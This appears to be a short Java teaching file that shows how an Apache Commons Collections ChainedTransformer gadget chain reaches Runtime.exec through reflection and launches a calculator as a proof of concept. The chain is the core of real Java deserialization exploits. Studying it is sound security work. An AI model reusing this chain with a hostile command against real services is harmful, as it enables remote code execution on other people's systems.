import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class Concept07 {
    public static void main(String[] args) {
        try {
           // concept of ChainedTransformer
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",
                            new Class[]{String.class, Class[].class},
                            new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke",
                            new Class[]{Object.class, Object[].class},
                            new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec",
                            new Class[]{String.class},
                            new String[]{"/usr/bin/gnome-calculator"}),
            };

            Transformer chainedTransformer = new ChainedTransformer(transformers);
            String key = "any_key"; // we trigger with any Object by passing to the transform() method
            chainedTransformer.transform(key);  // during the creation of the object in the memory the code execution occurs

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
